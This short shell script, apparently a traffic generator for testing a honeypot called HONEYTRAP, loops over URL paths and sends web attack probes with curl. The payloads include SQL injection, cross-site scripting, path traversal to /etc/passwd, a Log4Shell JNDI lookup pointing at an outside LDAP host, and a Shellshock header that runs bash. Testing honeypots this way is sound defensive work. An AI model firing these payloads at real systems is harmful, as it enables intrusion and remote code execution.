# Web attacker: SQLi / XSS / traversal / Log4Shell / Shellshock probes.
paths='/ /admin /wp-login.php /.env /.git/config /phpinfo.php
  /?id=1%27%20OR%20%271%27=%271 /?q=%3Cscript%3Ealert(1)%3C/script%3E
  /../../../../../../etc/passwd /index.php?page=../../../../etc/passwd
  /cgi-bin/test.cgi /api/v1/users?filter[]=1)%20UNION%20SELECT%20*%20FROM%20users--
  /solr/admin/cores?action=CREATE /struts2-showcase/'
for port in "$HTTP_P" "$HTTP2_P"; do
  for u in $paths; do
    curl -s -o /dev/null -m 5 -A 'sqlmap/1.7#{jndi:ldap://45.9.148.99/a}' "http://$HONEYTRAP:$port$u"
    curl -s -o /dev/null -m 5 -H 'User-Agent: () { :;}; /bin/bash -c "id"' "http://$HONEYTRAP:$port$u"
  done
done
